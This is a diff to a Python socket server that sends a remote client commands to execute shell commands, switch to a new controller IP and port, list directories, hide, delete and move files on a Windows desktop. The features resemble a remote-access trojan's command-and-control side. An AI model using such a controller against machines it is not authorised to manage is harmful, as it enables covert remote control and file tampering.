@@ -12,11 +12,14 @@ from SocketManager import SocketManager
 # }
 
 
+HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
+DIR_TO_MOVE = r"C:\Users\admin\Desktop\New folder"
+FILE_TO_MOVE = r"C:\Users\admin\Desktop\hidden files.txt"
 FILE_PATH = "C:\\Users\\admin\\Downloads\\calc.exe"
+FILE_INFO_DIR = r"C:\Users\admin\Desktop\New folder"
 EXE_STR = "netstat -a -n -o"
 NEW_IP = "192.168.43.49"
 NEW_PORT = 4001
-FILE_INFO_DIR = r"C:\Users\admin\Desktop\New folder"
 CHUNK_SIZE = 1024
 
 
@@ -60,31 +63,56 @@ if __name__ == '__main__':
         # data = conn.recv(BUFFER_SIZE)  # ok for packgae
 
         # Execute
-        SocketManager.send_data(conn, "EXECUTE")
-        packet = EXE_STR
-        SocketManager.send_data(conn, packet)
+        # SocketManager.send_data(conn, "EXECUTE")
+        # packet = EXE_STR
+        # SocketManager.send_data(conn, packet)
+        #
+        # data = SocketManager.receive(conn)
+        #
+        # print(data)  # TODO handle /n
+        #
+        # # Change IP
+        # while True: # TODO: timeout or scheduler
+        #     SocketManager.send_data(conn, "CHANGE_IP")
+        #     packet_str = "%s:%s" % (NEW_IP, NEW_PORT)
+        #     SocketManager.send_data(conn, packet_str)
+        #     response_from_client = SocketManager.receive(conn)
+        #     if response_from_client == 'accept':
+        #         print(response_from_client)
+        #         break
+        #     else:
+        #         print(response_from_client)
+        #
+        # # file system info
+        # SocketManager.send_data(conn, "FILE_SYSTEM_INFO")
+        # SocketManager.send_data(conn, FILE_INFO_DIR)
+        # data = SocketManager.receive(conn)
+        # print(data)
+        #
+        # show hidden file
+        # SocketManager.send_data(conn, "SHOW_HIDDEN_FILE")
+        # SocketManager.send_data(conn, HIDDEN_FILE_PATH)
+        # data = SocketManager.receive(conn)
+        # print(data)
+        #
+        # # hide file
+        # SocketManager.send_data(conn, "HIDE_FILE")
+        # SocketManager.send_data(conn, HIDDEN_FILE_PATH)
+        # data = SocketManager.receive(conn)
+        # print(data)
 
+        # delete file
+        # SocketManager.send_data(conn, "DELETE_FILE")
+        # SocketManager.send_data(conn, FILE_TO_MOVE)
+        # data = SocketManager.receive(conn)
+        # print(data)
+
+        # move file to other directory
+        SocketManager.send_data(conn, "MOVE_FILE")
+        SocketManager.send_data(conn, FILE_TO_MOVE)
+        SocketManager.send_data(conn, DIR_TO_MOVE)
         data = SocketManager.receive(conn)
-
-        print(data)  # TODO handle /n
-
-        # Change IP
-        while True: # TODO: timeout or scheduler
-            SocketManager.send_data(conn, "CHANGE_IP")
-            packet_str = "%s:%s" % (NEW_IP, NEW_PORT)
-            SocketManager.send_data(conn, packet_str)
-            response_from_client = SocketManager.receive(conn)
-            if response_from_client == 'accept':
-                print(response_from_client)
-                break
-            else:
-                print(response_from_client)
-
-        # file system info
-        SocketManager.send_data(conn, "FILE_SYSTEM_INFO")
-        SocketManager.send_data(conn, FILE_INFO_DIR)
-        data = SocketManager.receive(conn)
-
         print(data)
+
 
 conn.close()
